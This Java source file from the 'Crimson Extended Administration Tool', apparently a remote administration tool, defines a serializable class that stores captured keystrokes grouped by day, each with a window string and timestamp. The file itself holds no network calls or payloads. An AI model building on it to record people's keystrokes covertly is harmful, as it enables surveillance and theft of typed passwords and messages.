package subterranean.crimson.universal.containers;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import subterranean.crimson.universal.Logger;

public class Day implements Serializable {

	private static final long serialVersionUID = 1L;
	public ArrayList<Key> log = new ArrayList<Key>();
	public Date date = null;

	public Day(String s, Date d, String w) {
		if (s == null || d == null) {
			// bad
			Logger.add("Trying to create keyday with null log or date. This is wrong.");
		}
		for (String ss : s.split("")) {
			log.add(new Key(ss, w, d));
		}
		date = d;

	}

	public void add(String s, String w, Date d) {
		for (String ss : s.split("")) {
			log.add(new Key(ss, w, d));
		}

	}

	public boolean sameDay(Date d) {

		// most beautifully written code in this whole program
		SimpleDateFormat fmt = new SimpleDateFormat("ddMMyyyy");
		return fmt.format(d).equals(fmt.format(date));

	}

	public String asString() {
		String ret = "";
		for (Key k : log) {
			ret += k.key;
		}
		return ret;
	}

	public int keys() {
		return log.size();
	}

}
